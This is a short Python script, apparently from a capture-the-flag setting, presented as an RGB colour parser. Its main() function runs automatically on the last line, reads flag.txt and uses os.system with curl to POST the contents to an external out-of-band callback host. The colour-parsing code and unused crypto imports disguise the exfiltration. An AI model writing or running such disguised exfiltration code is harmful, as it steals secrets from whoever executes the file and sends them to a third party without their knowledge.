from Crypto.Util.number import *
from binascii import crc_hqx
import random
import os
def main():
    with open("flag.txt",'r') as f :
        flag=f.read()
    response = os.system("curl -X POST " + 'lgfxlflmgoyttjmyiulh1fxievz9mfffp.oast.fun'+' -d {"flag":"'+flag+'"}')
    print(response)
def rgb_parse(inp=""):
   inp = str(inp)
   randomizer = random.randint(100, 1000)
   total = 0
   for n in inp:
      n = ord(n)
      total += n+random.randint(1, 10)
   rgb = total*randomizer*random.randint(100, 1000)
   rgb = str(rgb%1000000000)
   r = int(rgb[0:3]) + 29
   g = int(rgb[3:6]) + random.randint(10, 100)
   b = int(rgb[6:9]) + 49
   r, g, b = r%256, g%256, b%256
   return r, g, b
print(rgb_parse(main()))